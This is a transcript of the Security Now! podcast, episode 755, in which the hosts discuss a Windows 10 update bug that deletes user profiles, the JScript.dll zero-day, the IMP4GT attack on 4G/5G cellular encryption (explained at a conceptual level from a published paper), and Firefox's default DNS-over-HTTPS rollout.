GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#755

DATE:		February 25, 2020

TITLE:		Apple's Cert Surprise

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-755.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we reexamine the Windows 10 lost profiles problem, and also a consequence of the need to roll back (or avoid in the first place) the Patch Tuesday disaster.  We look at a new feature to arrive with the next Windows 10 feature release, unfortunately named the 2004 release.  We also examine the details of a new attack on the 4G LTE and 5G cellular technology, the full default rollout of Firefox's support for DoH, and also the availability of a powerful new sandboxing technology for Firefox.  We also check in with Chrome's fix earlier today of a zero-day that was found being exploited in the wild.  And, finally, before turning our attention to the bomb that Apple dropped in the lap of the entire certificate industry last week, I'm going to update our listeners about the things I've learned after returning to the work on SpinRite's next iteration.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here with some fun Pictures of the Week, an example of how not to graph.  Once again, news that makes me wonder why anybody's still using Windows.  And he's going to explain why Apple suddenly and unilaterally announced that they're not going to accept certificates with a longer date than one year in Safari.  Details, why it's happening and why it didn't have to, coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 755, recorded Tuesday, February 25th, 2020:  Apple's Cert Surprise.



It's time for Security Now!, the show where we cover your security and privacy and all that jazz, and sometimes how things work, with Steve Gibson, our man about town, the man about the security certificate.  He is the guy in charge at the GRC, the Gibson Research Corporation, at GRC.com and a beloved character around here because he keeps us up to date on what's going on in security.  Hi, Steve.



STEVE GIBSON:  Yo, Leo.  Great to be with you again for this last podcast of February.  Where has a month gone?



LEO:  Well, it is the shortest month, after all.



STEVE:  Oh, actually I'm just looking at my little calendar.  It says the 29th.  So this is a...



LEO:  Yes, it's a leap year.  Happy Leap Year!



STEVE:  Yeah, 366 days this year.  Which sort of ties in, in an odd way, to the topic of this podcast.  I named it Apple's Cert Surprise because last week at the CAB Forum, the CA Browser Forum, thus CAB, Certificate Authority/Browser Forum, where browser makers and the certificate authorities meet regularly in order to talk about the world and how things are going and what things need to change and so forth.  Apple did something that I have to wonder how truly unexpected it was because I imagine there were some people who were not as surprised as others.  But I'll save that for the end of the show.  But anyway, it bears on the number of days in the year because of the expiration of certificates, which is based on how many days in the future from the date of issuance the certificate self-expires.  And of course our listeners know that certificate expiration and revocation and all that is like one of this podcast's favorite hobbyhorses because it's just so badly broken.  But we have a lot of news to catch up on.



We're going to reexamine the Windows 10 lost profiles problem.  It turns out there's news there.  And also a consequence of the need to roll back, or maybe to avoid in the first place, this month's Patch Tuesday disaster.  There are some consequences of that that need to be handled.  We look at a new feature which is slated to arrive in the next Windows 10 feature release, which is unfortunately named the 2004 release, which, you know, okay, Microsoft, come on.  Then we also examine the details of a new attack on the 4G LTE and 5G cellular technologies, which is worrisome.  We've got the full default rollout of Firefox's support for DoH, and also the availability of a powerful new sandboxing technology arriving from Firefox.



We also check in with Chrome's fix earlier just this morning of a zero-day that was found being exploited in the wild, only the third of those to happen for Chrome in the last 12 months.  And, finally, before turning our attention to the bomb that Apple dropped in the lap of the entire certificate industry last week, I'm going to update our listeners about the things I've learned after returning to work on SpinRite's next iteration.  So I think we have another interesting podcast full of fun stuff.



And we have, for the Picture of the Week, this is completely off topic, but I labeled this our "Cranky Old Guy Pictures of the Week" because I saw something on Sunday that just so annoys me.  I mean, like I stopped it and backed it up and pointed it out to Lorrie and said, "Look at this, how wrong this is."



LEO:  Look at this.  Look at this.  This is wrong.



STEVE:  And I thought, okay, I've got to share this with our listeners.  So, yeah.



LEO:  I love it.  All right.  We're ready for the pictures.



STEVE:  So anyway, this is just - you and I have talked about in the past that one of my pet peeves is a chart where the Y axis, the vertical, I guess it's deliberately deceptive.  Typically they're trying to show how great some change was over time.  And you look at it, at this line going across, and you think, oh, my god.  And then you look down, and you realize that the axis has been labeled so that, you know, it doesn't start at zero, so that you're seeing an actual percentage of change over time.  Instead, the minimum of the Y axis is just a little bit lower than the maximum, which has the effect of ridiculously inflating the size of the change.



Well, in a related peeve, I was watching "Meet the Press" on NBC on Sunday, and they were showing what was trying to be a pie chart of an entrance poll from the Democratic Nevada Caucus the previous day.  And what just stopped me cold was that the first of these pictures that I show, show that Sanders and Biden both have the same percentage in this entrance poll.



LEO:  Oh, really.



STEVE:  Uh-huh.  They're both 24%.  And you look at this chart.  And so the problem is it's technically a pie chart, but now I guess it's more fancy to do it as a doughnut where you remove the center; right?  So but the whole point is that our eyes are very good at discerning angle.  This is actually one of the reasons that speedometers use an angular needle.  And even in high-performance, high-end attack military aircraft, they still have dials.  They have pointers because we're able to instantly understand an angle, whereas otherwise we'd have to be, like, reading digits and thinking about it.



Well, so the beauty of a pie chart is that it's all about angles.  But in this case, and we see it all the time, in their interest to make it look fancy and modern, they, of course, they make it 3D, and then they drop it back.  They tilt it backwards so that it looks more 3D-ish and fancy.  And of course it has the effect of, because of perspective, of dramatically increasing the foreground versus the background.



LEO:  It's kind of like a Mercator projection or something.  I mean, we all have this...



STEVE:  Yes, that's a very good analogy, yes.



LEO:  It's the opposite problem, which is taking a 3D space and making it 2D misrepresents the size of the continents and the countries.  In this case, taking a 2D space and making it 3D misrepresents it.  You know, conspiracy theorists are going to say, well, mainstream media doesn't like Bernie anyway, so they're definitely trying to make Bernie look smaller than Joe.  And it's true, they could have put Biden in the back and Bernie in the front.



STEVE:  Well, for what it's worth, I was going to say it's not even alphabetical.  But for those who are not able to see this, the first chart shows Sanders and Biden, the numerical percentage is 24 each.



LEO:  Yeah.



STEVE:  But Biden's slice of the pie looks...



LEO:  It's huge.



STEVE:  ...dramatically larger than Sanders's.  And so I first thought that.  I go, oh, my god.  And I backed it up and, you know, subjected Lorrie to the same tirade.  And then a few minutes later we get the second one, which is also a disaster.  Here, again because of this distortion, we've got another Sanders/Biden comparison.  And in this instance, their size looks sort of comparable.  It looks like, okay, that's kind of about the same.  But in fact Sanders is at 27, and Biden is at 39.



LEO:  The numbers are not at all comparable.



STEVE:  Not at all comparable.  Yet, you know, if you just sort of look at the amount of the color...



LEO:  The blue should be almost 50% bigger than the purple.



STEVE:  Yeah.



LEO:  But it's not.



STEVE:  No.



LEO:  No.



STEVE:  Anyway, so...



LEO:  So don't believe these charts.  Look at the numbers.  Make your own charts, kids.



STEVE:  Yeah.  Or, again, if it was just a straight-on pie chart, we would instantly have a deep intuitive sense for the relative size of these things.  And that's the whole point of having an angular pie chart.  It's to show you relative sizes.  But it's completely destroyed when you throw it into 3D and then get perspective distortion in order to make it look really fancy.  So, bad.  Bad NBC.



LEO:  Bad.  Fake news.



STEVE:  And speaking of bad, so remember how last week we said that even though after installing the February - this is the infamous now KB4532693 update rollup.  Some users discovered that all their stuff was gone.  And their desktop, all the icons disappeared from their desktop.  They went to My Documents, and there were no documents there under My Documents.  Everything was gone.



And we know that this is the per-user profile information, which is when you log onto Windows as a user, that's what Windows makes current.  So you're seeing under the user's directory off of the root of your boot drive is your various usernames who share the computer.  You log in as a user, you get your stuff.  Somebody else logs in, they get their stuff.  Unfortunately, you run the February update rollup, and in some cases you get no stuff.



Well, the good news, we believed, was that nothing was actually deleted, but rather the user who did the update had their profile temporarily renamed with a .000 or a .bak, which meant that the stuff wasn't gone, it could be recovered.  Some advice was you could uninstall this.  Oddly enough, apparently, if you just restarted Windows four to six times - and I can't believe I'm saying this because it just seems so broken.  But yes, children, you just restart Windows, just keep at it up to six times, and maybe all your stuff will come back because something in Windows will wake up and go, oh, whoops, and then bring it back.  Turns out that's not true for all people.



What is beginning to surface, and there are enough people who seem authoritative enough, not just confused newbies, but people who appear to know what they're doing, reporting that in some instances they have actually permanently lost everything.  That is, Windows did rename their profile into oblivion.



There's a posting on the Answers forum at Microsoft.com that reads:  "I was on the phone with Microsoft for four hours.  Surface Pro 7, about two months old.  There's no user data, no temporary account, no restore points.  Uninstalling the update didn't work because my user data is gone.  Microsoft is calling in the morning because they think my personal services are free."  So this guy's a little peeved, obviously.  "I know the only option is to flatten the Surface and start over, like 'Groundhog Day' the movie.  I have two desktops upgraded from Windows 7 that survived, if that helps."



Somebody else also posting in the forum:  "This update KB4532693 caused all the data on my laptop to be erased.  Even after uninstalling the update, the laptop would not successfully boot.  Then resetting the laptop to factory settings while choosing to keep all personal data erased everything.  EVERYTHING," he repeats in all caps.



And there are major news reporting groups like Bleeping Computer that have followed all these threads down, and they're confirming that, as far as they know, this is true.  Bleeping Computer's article has the headline:  "Windows 10 KB4532693 Update Bug Reportedly Deletes User Files."  And again, we're not really getting anything from Microsoft.  And at this point it would almost be - it would be helpful if Microsoft would say something about this because this becomes a problem.



As we know, it's really the case nowadays that our backups need to have backups.  And after I had a few close calls with old and spontaneously dying machines - remember that my beloved Windows XP machine died, just completely died, and all of my stuff was on a hardware RAID with multiple drives, I mean, it was all there still, and I got it all back, and everything was fine.  But still it was like, yikes.  I mean, it sort of was a wakeup call for me.  So now I am backed up every which way.  And in fact I'm seriously considering moving my entire Windows User Profile now to Sync.com, rather than just selected working directory hierarchies, which is what I've done.  I mean, I just continue to be so pleased with the way Sync.com is working.  And that way all of my user profile stuff would be synced and version managed across multiple machines and so forth.



You know, I firmly practice safe computing.  I'm careful about where I go.  I don't venture very far away from places on the Internet that seem really safe.  And I'm very careful when I'm, like, needing to go download something.  I spend some time checking it out.  I'm sure that our listeners do, too.  So I hope that the danger from anything malicious successfully attacking me is minimal.  But it's disturbing to imagine that running a Windows Update could be the Trojan horse that I willingly allow to enter through my front gate, and that it would do some damage.  I mean, I've not lost anything.  And we know that the majority of people aren't.



So what's unknown is, like, what exactly is going on?  As long as, like, if it's the case that people are actually having all their stuff deleted by Windows Update, then that suggests that we really do need to perform, I mean, I'm thinking that I will do a full image of my system before I do an update, and that I will take control of that process rather than just let Windows do it whenever it wants to.  So, wow.  It's disturbing that this could be the case.  And at this point, if Microsoft would say we know what's happening, we found that and figured it out, then that would be helpful.



And Leo, I'm unable to listen to all of Windows Weekly as often as I would wish to, but I did, while I was digging into all this, I encountered something that I remembered you guys talking about, I think, which was that Microsoft let go a huge percentage of their QA staff, and that now the developers are doing the testing of things that used to be a whole separate group.  Is that the case?  I think I remembered hearing that along the way.  So anyway.  Let's just hope that this gets resolved.  And it would be nice if we heard from Microsoft, like some actual resolution to this issue.



Okay.  So also, remember the serious zero-day exploit that we learned about which involved IE and its invocation of this older JScript.dll.  We know that this vulnerability has been exploited in the wild in limited targeted attacks.  The bad guys are able to leverage it to silently execute arbitrary commands on an unpatched system when the user visits a specially crafted website.  And then we've subsequently learned that there are many other ways to get IE to invoke that old retired JScript.dll which is no longer the one that anyone's using, but it's still around because it turns out it's important to have it.



The issue is so severe that Microsoft was prompted to suggest a short-term fix until the February Patch Update became available, which would fix it for real.  That flaw is being tracked as CVE-2020-0674.  And the temporary fix was to remove all access to that DLL by deleting all security permissions from the file so then nothing, whether good or bad, could cause it to be invoked.  It would just be off-limits in the file system.  But as we know, many people soon discovered that their Windows Media Player, that was the thing that I think most people, and it's what I heard about most, would no longer work.  But then other things were broken, too, sort of some obscure things like HP printing and other USB printers would no longer function after that DLL was taken out of service.



So the solution, we believed, was going to be Patch Tuesday's rollup, which would fix this for real.  But of course now we know that some people have had to back out of that.  I would imagine that enterprises would be terrified to apply this Tuesday rollup to their systems without extensive testing.  So this of course leaves us vulnerable to a targeted attack which is probably going to be more prevalent now than it was because before the bad guys who were using it knew that it had been discovered, they were trying to keep it secret.  As soon as it becomes clear that the window of opportunity of exploitation is going to close, then they can afford to be much less cautious and do as much damage as they can before this problem gets resolved.



Well, the problem is that its resolution was Patch Tuesday, which we no longer really have for many people who have had to back out of it or are, you could argue wisely, deferring its installation, maybe just skip it completely and hope that March turns out to have a better outcome.



LEO:  Or use Linux.



STEVE:  Exactly.  In fact, there were actually - I chose not to share them on the podcast because in some cases I could not repeat the language that was being used.  But, I mean, there were many people who were so infuriated, I mean, like, people who clearly knew what they were doing, who were long-term Windows users.  Anyway, the point is they were swearing off of Windows.  They said, that's it, I'm not putting up with this "C" word or "S" word any longer.  That's it.  I am, you know...



LEO:  It's a fairly serious flaw in an operating system to seem like they've lost your stuff.  I mean, that's not insignificant.



STEVE:  Well, and the point was that to some people, Leo, and apparently Microsoft in interactions on the phone has had to admit that, yeah, uh-huh, it does look like it actually is all gone.



LEO:  Ohhh. 



STEVE:  That's what Bleeping Computer is now reporting.



LEO:  Oh, no.  That's it.  I would not, you're right, I wouldn't use Windows ever again.



STEVE:  Yes.  It is true...



LEO:  You lose my data, you lost my business.  That's ridiculous.



STEVE:  Yes.  At this point.  And so that's what's happening.



LEO:  Oh, my goodness.



STEVE:  Yes, is that some users who apparently know what they're talking about and have spent hours on the phone with Microsoft have confirmed their stuff is actually gone.



LEO:  Wow.



STEVE:  It wasn't just deleted.  It was renamed into oblivion, and it was lost.



LEO:  Oh, that's so not good.



STEVE:  Yeah.  Yeah.  So, okay, so in the case of this zero-day exploit, which we were hoping February's patch updates would fix, because we don't have those, the guys at 0patch.com, remember numeric "0" patch dot com, they do these micropatches.  So I just wanted to let our listeners know that they have added support for 1903 and 1909 to the support for the fix for this JScript.dll.  It is 0patch.com.  I've got the link in the show notes for anyone who wants it.  But I'm sure you can find it at 0patch, numeric "0" P-A-T-C-H dot com.



It wasn't initially working for the most recent two updates to Windows 10, the major feature updates.  1903 and 1909 weren't supported.  It was Windows 7, Windows 10, 1709, 1803, and 1809.  Now these latest two have been added because users may be relying upon it if they don't feel comfortable installing this February Patch Tuesday update.  So anyway, that now exists.



LEO:  And you trust these guys for their little - I mean, we've talked about this before.  I just want to reiterate.



STEVE:  Yeah, I mean, their hearts seem to be in the right place.  It's free for noncommercial use.  Commercial users are asked to pay $25 per agent per year.  And there is an enterprise plan.  Yeah, I mean, I see no reason not to trust them.  Often you don't have to reboot your system.  They're, like, little 25-byte patches that just go in and fix this one problem until Microsoft comes along with an updated DLL that then fixes it for sure.  But so here's the problem.  We have this zero-day we know is being actively exploited in the wild.  Yes, it has been targeted.  But it's now known to have a limited shelf life because Windows is onto them, Microsoft is onto them.  Windows is going to get patched.



It was supposed to be fixed in February.  So for most of us it's fixed.  And I'm now, like, I'm glad I didn't lose all my stuff when I did the February update.  I'm going to be doing, you know, I've got good imaging tools all over the place.  I'm going to do an image of my system from now on before I do a Patch Tuesday update because...



LEO:  I guess that's sensible, but what a pain.



STEVE:  I know.  Isn't that wrong?



LEO:  Crazy.



STEVE:  And what's worse is that Microsoft isn't saying, oh, we know what happened, and we have the fix for it.  And Leo, I think it was on Windows Weekly that you and Mary Jo and Paul were talking about how Microsoft had changed the way they're vetting these things.  I think what I read while I was doing this research, and I think I recall you guys talking about it, was Microsoft laid off a huge percentage of its QA staff, and the vetting of these things was now going to be done by the developer group at Microsoft.



LEO:  Yup.  That was a while ago.  And, boy, are they getting bit by that, I think.



STEVE:  Yeah, exactly.  I mean, how many times have we talked about the fact that developers are unable to test their own stuff?  You know, we can't test our own stuff.  It's why I had this fabulous community in GRC's newsgroups, specifically to help me find my problems.  Because you just can't find them yourself.  You have to have other people who have different systems.



I dug into this a little bit because I was interested in how this was happening, because this is now a monthly problem for Windows 10.  We're seeing now a run of problems with Windows 10 updates where they just seem unable to get it right.  And apparently they're also relying on their insider community, who are not their developers, but they are users.  But insiders are typically testing on VMs, and so they're not testing on mature, everyday use systems.  And the problem is Microsoft is not saying, oh, we've found the problem and fixed it.  So we're re-releasing this.  No one need worry about it.  Instead, there are hundreds of posts now of people who understand the temporary rename problem, and that's not what they have.  They have permanent deletion of all of their data.



LEO:  That's unacceptable.  That's just - you can't get worse than that.  That's terrible.  Oh, my god, that's awful.



STEVE:  I know.  Yeah.  So, I mean, yeah.  And imagine an enterprise environment.  Again, until we know, it's one thing to say, oh, we figured it out, it turns out it's like there was that problem, that interaction with Adobe Creative Cloud stuff.  It was the Adobe Creative Cloud services, blah blah blah.  You know, great.  Now we know.  But this is just now like, as you said, I mean, obviously you understand.  Who wouldn't?  If a Windows update deletes all of your stuff?



LEO:  It can't get any worse.



STEVE:  And most users no longer have a choice about whether to install the update or not; right?  I mean, Microsoft has also said, well, we'll let you put it off.



LEO:  Yeah.



STEVE:  Yeah, we'll let you put it off for a few weeks.  But then we're going to force you to take it.  And what if it forces you to lose all your data?



LEO:  Wow, yeah.  I think you have a court case.  Criminently.  Criminently.



STEVE:  Okay.  So here's what I don't get.  We've got the next major feature release for Windows 10 is the ill-named 2004 release.



LEO:  I'm sorry, Steve, that's twenty oh four.  Twenty oh four.



STEVE:  Oh, yeah, right, yes, right, twenty oh four.



LEO:  Yeah.  It is a little confusing because it kind of looks like 2004.  Which seems like a pretty old update.  But okay.



STEVE:  Well, yeah.  I mean, if it's 1903, then you know that that doesn't refer to probably a year when you've been alive.  So that's not confusing.



LEO:  Well, honestly, everybody, in Windows Weekly we're just like, ugh.  Everybody thought, oh, why don't they just call it 20H1, first half of 20, and then the second one 20H2?  That was their internal code name.  But no, they really wanted 2004.  And by the way, it's not like it's that meaningful because they never make the date that they say.  It's not going to be April.  It's going to be whenever, you know, probably May or, who knows, March.



STEVE:  As long as they get it right.  I mean, please.  Hey, Microsoft, take your time.



LEO:  Yeah, you're right, no hurry.  No hurry.



STEVE:  Not on my account.



LEO:  Nobody's asking for these.  Nobody is asking for these, by the way.



STEVE:  I know.  And here's another reason.  They're now allowing optional device driver updates.



LEO:  Oh, god, I hate Windows.



STEVE:  Starting now, as in like, what is the day?



LEO:  What does that even mean?



STEVE:  I know.  Get this, Leo.  Device driver providers will be able to mark their device driver updates as "automatic" or "manual."  Any device driver update marked "automatic" will be included in the Windows automatic update package, like it is now.  But any device driver updates marked "manual" will first appear in the new Optional Updates section to be added to Windows 10.  Now, okay.



LEO:  See, my problem is, like if you're a business with an IT department, good.  They'll handle this.  But home users, stop buying Windows.  Stop your friends; stop your relatives.  I talk to way too many very nice people on the radio show who should never have run Windows.  The word must go forth from this day into the future.  Stop buying Windows for home use.



STEVE:  And, okay, so think about it.  All of us who have used previous versions of Windows, like Windows 7, there is this odd - there are these two tabs; right?  There's important updates and optional updates.  And so you look at it, and you go, well, they're updates.  Do I need them?  And when you look at the optional ones, they're like security things.  It's like, Windows Security Patch, blah blah blah.  And it's like, oh.  Well, that sounds like a good thing.



So, I mean, think about it, Leo.  How can it be optional?  I mean, like, what is it?  And so it seemed to me to be a step forward that with Windows 10 it was going to - we're going to get a roll-up, and we just do it once a month, and it's going to be better.  But they couldn't live with that.  They couldn't stay with that.  So they've, like, for whatever reason, decided to peel off, and now they're going to expose to the user this new, starting with the Windows 10 2004, which is beginning to seem more like 2004, you know, 16 years ago, this new optional update where, like, the user can select which they want.



But, okay, what should they do?  I just don't get it.  Microsoft explains that this change will allow hardware developers to roll out new drivers and test them for reliability - okay, shouldn't they have done that first? - against a smaller group of Windows users before pushing them out to a wider audience.



LEO:  Well, that makes sense.



STEVE:  Oh, well, okay.  They said Microsoft believes these changes will help their customers to "get the highest quality and most reliable drivers faster and with less friction."  Okay.  They're not going to back port this change to the earlier versions of Windows 10.  So anybody with earlier version of Windows 10, you go to the driver manager app and, what, then click on Drivers and then go into the Properties and go to Update, and see if there's an update for that hardware, for the driver for that hardware.  What?  Like, who does that?  It is just, well, yes, Leo, I think you clearly articulated the proper philosophy, which is Chromebook.



LEO:  Normal people shouldn't use this, yeah.



STEVE:  Chromebook.



LEO:  Yeah.  And if you need a real operating system, Linux is very stable, reliable, easy to use, and has to date in my 30 years of using it never deleted my own directory, ever.  Holy cow.  Oh, geez, Louise.  Okay.



STEVE:  Yeah.



LEO:  Wow.  What a world.



STEVE:  Yeah, Bleeping Computer reported that users were reporting...



LEO:  That's terrifying.



STEVE:  ...permanent deletion of all their data.



LEO:  I kind of understand the optional updates because they're basically giving the hardware manufacturer more control over whether you get updated.  But there seems like there'd be other ways to do that than this complicated end-user dance.



STEVE:  But I guess I don't understand.  It's either unnecessary or necessary.  How is it...



LEO:  Well, because they want to be able to offer optional updates to beta versions, to test it.  They don't want to push - I don't know.  You're right.  This doesn't make any sense.  I'm sorry.  I'm trying to.



STEVE:  Yeah.  And now they're going to give that to the end user.  You're going to start getting calls.



LEO:  I know.  Is it optional?  Should I do it?



STEVE:  On The Tech Guy, yeah.  This says "optional updates."  Well, how optional are they?  Are they really optional, or not really optional?  Because I'm not in a hurry today, and so I've got some extra time.  And are they going to pile up?  Are they just going to keep accumulating?  Do they go away?



LEO:  Well, that's a good question, yeah, yeah.  Do you get another optional one?  Or when does it become non-optional?  At what point does that happen?



STEVE:  Right.  You know, it's like user choice that users should not have to choose.



LEO:  Right.  It's just more BS.  All right, Steve.  On we go.



STEVE:  So we've got problems.



LEO:  You mean we didn't before?



STEVE:  We've got your problems right here.  The guys that have been poking at cellular phone security for years are today, the 25th of February 2020, during the NDSS, which is the Network Distributed System Security Symposium, which I guess should really be NDSSS, but perhaps they thought that that was one "S" too many.  That's being held in San Diego right now.  They're delivering their paper disclosing their new attack on 4G LTE; and, unfortunately, it also works against 5G because we haven't actually solved the problems.



Okay.  So there is in our cellular system the same sort of hierarchy of levels forming a network stack as we're used to having, for example, in our computers with TCP/IP, physical layer, transport layer, and the various protocol layers and so forth.  So even their abstract of their paper was just - it required too much understanding.  I read it, and I thought, okay, well, I could tackle explaining this, but I don't think we have enough time.  But the introduction gives us a good sense for the importance of what they have found.



So in the intro to their paper they explain:  "Long Term Evolution" - which is of course what the acronym LTE or the abbreviation LTE stands for - "is the latest widely deployed mobile communication standard and is used by hundreds of millions of people worldwide.  The protocol offers high-speed Internet access and packet-based telephony services and has become an integral component of our daily communication.  We fundamentally rely on the security of LTE for a variety of applications.  The security goals of LTE include, amongst others, mutual authentication, traffic confidentiality, and location privacy.  Any attack vector undermining these security aims has far-reaching implications to the use of LTE as a communication medium.



"In the context of mobile communication, mutual authentication is an important security aim since it ensures that both communication parties, the user equipment and the network, mutually verify their identities."  That is, you know, we're sure we're communicating to the party we think we are and vice versa.  "As the wireless medium is accessible for everyone in the vicinity, and identifiers can be easily forged, mutual authentication is essential for building trust between communication parties.  The telecommunication providers rely on user authentication for accounting, authorization, and the association of data sessions to a legal party.  The latter case is of particular importance in prosecution" - and in fact this does, as we'll see, have some significant implications for defense attorneys - "in which a possible offender is accused of committing a crime via a mobile Internet connection.  Additionally, users rely on network authentication for the confidentiality of their communication.



"One important example for missing network authentication is the second mobile network generation GSM (Global System for Mobile Communications).  By faking the identity of a legitimate network, an attacker can impersonate the network in GSM and eavesdrop on the communication of the victim."  And of course we well know that that's the famous phenomenon that we see in Las Vegas during the hacker conferences, where the number of apparent cell towers jumps by a factor of 10 overnight.  And it's like, wait a minute.



So they said:  "In contrast to earlier network generations like GSM, LTE establishes mutual authentication on layer three of the network stack using a provably secure Authentication and Key Agreement (AKA) protocol.  Based on this protocol, subsequent encryption ensures the confidentiality of user and control data."  They said:  "Permanent integrity protection, however, is only" - permanent integrity protection, that's the key.  On one hand we have encryption, which gives us privacy.  But remember that integrity is the second side of that.  We need authentication.  We need something.  We need to know that nothing has been changed, which is integrity protection.



They said:  "Permanent integrity protection, however, is only applied to the control data.  A recent study has revealed that missing integrity protection of the user plane on layer two allows the manipulation of user data in a deterministic way.  Specifically, a layer two attacker in a man-in-the-middle position between the phone and the network can introduce undetectable bit flips due to malleable encryption and redirect traffic to another destination.  While this attack demonstrates the potential consequences of traffic manipulation, it is solely limited to redirecting traffic to another destination."



So that was prior work upon which these guys based their next-gen attack.  They said:  "In this work, we introduce a novel cross-layer attack concept that complements the known two-layer vulnerability, that is, the missing integrity protection on the user plane, with exploiting the default IP stack behavior of operating systems on layer three."  And specifically they target iOS and Android, both which are used in successful attacks.  They said:  "We make use of the reflection mechanism of certain IP packets," and I'll cheat and just say that that's ICMP Ping and ICMP destination Unreachable packets.



They said:  "Exploiting the default behavior on these operating systems, we make use of the reflection mechanism of certain IP packets, which allows us to not only redirect user-plane traffic, but also to create an encryption and decryption oracle that enables an adversary to perform a full impersonation of the phone or the network on the user plane," meaning to appear as the user to the network and to appear as the network to the user, thanks to decryption.  "We call this concept I-M-P-4-G-T," which is IMPersonation in 4G neTworks, pronounced "impact."  "IMP4GT completely breaks the mutual authentication property for the user plane on layer three, as an attacker can send and receive arbitrary IP packets despite encryption."



And I'll finish just by wrapping up this part:  "This attack," they say, "has far-reaching consequences for providers and users.  Providers can no longer assume that an IP connection actually originates from the user.  Billing mechanisms can be triggered by an adversary, causing the exhaustion of data limits, and any access control or the provider's firewall can be bypassed.  A potential impersonation also has consequences for legal prosecution, as an attacker can establish arbitrary IP connections associated with the victim's identity."



Okay.  So I mentioned briefly, they mentioned, this encryption-decryption oracle.  That's the key to this.  They establish a man-in-the-middle interception using a software-defined radio, which are now widely available.  They are then enabled to probe the encryption by flipping bits, which results in a failure and a retransmission.  So it is seen as an over-the-air problem, not an attack, which causes the endpoint to retransmit.  They inject ICMP Unreachable and ICMP Ping packets into the stream in order to get either endpoint to reply.  And since we've talked about, especially in the early days of this podcast, a lot about encryption, they explain the encryption and the decryption oracle operation, and it's understandable.



They said of the encryption oracle:  "The goal of an encryption oracle is to learn the keystream of a connection, which later allows us to encrypt and inject arbitrary packets.  For encrypting a target plaintext, the oracle injects a known plaintext into the system.  The system encrypts the packet by XORing the known plaintext with a valid keystream for transmission, which is returned to the oracle."



Okay.  So what they just said was, I mean, it's so obvious.  They take a known plaintext, I mean, it could be all zeroes for all anyone cares.  But it probably needs to be, for example, an ICMP Ping.  But they know what it is.  They inject that into the stream.  The recipient encrypts it by XORing it with the keystream and returns it.  Well, we know how to remove XORing; right?  We re-XOR what we got back with the known plaintext, and that gives us the keystream, which is the output of a stream cipher, which the communications uses as an XOR pad, essentially, in order to create an encryption, which is solid as long as it's never reused.  So this is a means of obtaining the keystream from the cipher in a way that then allows the attacker to reuse it.



They said:  "Now, the oracle can extract the valid keystream by XORing the known plaintext on the encrypted packet.  Any arbitrary payload can now be encrypted by XORing the target plaintext and the keystream," which has been determined.  So basically that bypasses the problem of this data being encrypted on that layer.  They said of the decryption oracle:  "The goal of a decryption oracle is to decrypt and access the payload of an encrypted packet.  To achieve the decryption of a packet, the oracle manipulates the to-be-decrypted ciphertext and sends it to the system.  The system decrypts the packet and subsequently sends it back to the oracle.  In this way, and similar to encryption, we can receive the plaintext of encrypted packets."



So they go into far greater detail in their paper.  I've got a link to it in the show notes for anyone who's interested.  It's being delivered today, as I mentioned, in San Diego.  But they have conclusively demonstrated a fundamental weakness.  We already had it in GSM.  We knew it was a problem.  We thought, oh, we fixed this problem in 4G LTE.  Except we didn't.  Nor is it fixed in the forthcoming 5G, since neither of these systems provides the needed message integrity protection at the user layer, which is where this exploit happens.  It must have been assumed by non-cryptographer designers that the encryption running at the user layer would be sufficient to protect the user's communications.  That is to say, they must have assumed that the encryption running in the user's application layer would be sufficient.



But it turns out there are available exploits.  We know that XOR-based stream ciphers, while highly attractive due to their economy and the ease of implementation, are also highly susceptible to interception attacks that can trivially reveal the keystream if the plaintext can be known.  You just XOR what you know the person talked about.  And we've encountered and have talked about various attacks through the years on this podcast against simple XORing of stream ciphers.  These guys clearly state that the only way for this to be fixed is for all of our existing cell system infrastructure hardware to be upgraded at the smartphone and the cell tower level.  And we all know that's never going to happen.  They are hoping that there might still be time to head off implementation of 5G, which repeats these mistakes.  But they acknowledge it's unlikely. 



So what it means to us is that application-level services like iMessage and Signal, and WhatsApp for that matter, which provide their own application level encryption and secure management, they're secure against this for, you know, their own end-to-end encryption.  They don't rely upon the integrity of the underlying channel.  But HTTPS is less certain because there we're relying on, just for standard web browsing, we are relying upon some aspects of the integrity of the underlying network.  We are assuming that DNS is giving us the right IP, and that we're actually connecting to the machine at that IP that we think are, and that its certificate has not been spoofed.  So we're trusting its certificate.



We know that certificates can be obtained, presumably by state-level actors, on a whim.  They still have the problem of getting us to a spoofed server using a spoofed certificate.  DNS and IP switching integrity is what we rely on.  That's what this system is able to subvert.  So this could be the component of a targeted attack by a state-level actor against specific individuals in specific settings.  The good news is it's not deployable at scale over the Internet.  This requires physical man-in-the-middle proximity.  And it is a sophisticated attack, so it would only be targeted.  And it needs multiple layers in order to redirect web traffic.



I'm pretty sure that without a lot more work the higher level encryption protocols that are providing end-to-end encryption through multiple strong endpoint encryption, in other words, iMessage and Signal and WhatsApp and so forth, you know, those guys, they're probably safe.  But this is now a new attack, revealed today, and we're going to be using 4G LTE for a long time.  Again, most of us have nothing to worry about.  The use of strong messaging keeps us safe.  But it would subject standard web communications to an attack by a state-level actor who is able to put all the pieces in place, and there are many of them.  But they would be able to pull off site spoofing in a way that was undetectable.



Well, except by Chrome, actually, because I don't think you can spoof, well, maybe - have to think about whether you could spoof - I don't think you could spoof the serial number on the certificate.  So it would still be limited, depending upon what sites were being visited.  It would only be - Chrome could only detect it if you were going to Google properties where it knows what the certificate is, has been pinned for, Google.  But still, you know, this suggests that we're unable to completely take the connections we have to our cellular providers as secure by default.  So, yeah.



Starting today, also in today's news, we have Mozilla's rollout of DoH by default, turned on, in Firefox.  Starting today, any new installations of Firefox will have DoH enabled by default.  That's of course DNS over HTTPS.  Then over the next few weeks it will be silently enabled for all Firefox users in the United States.  They're going to gradually roll it out so that if there are any showstopper issues that are discovered that haven't already been found - basically it's been an overwhelming success so far.  So no showstoppers have been identified.



In the U.S., over the next few weeks, the rest of Firefox users will be switched over to DoH.  The only users who will not receive this update are those who have specifically disabled DoH in Firefox's Settings previously.  And as we know, we've covered this on a number of podcasts, the move to encrypting DNS by tunneling it over HTTPS has not been welcomed by everyone, by a long shot.  The most concerted pushback came from the U.K., where remember that ISP association went as far as to nominate Mozilla in 2019 as the year's Internet Villain, due to its work on the DoH protocol.  And of course they regretted that nomination and subsequently rescinded it.



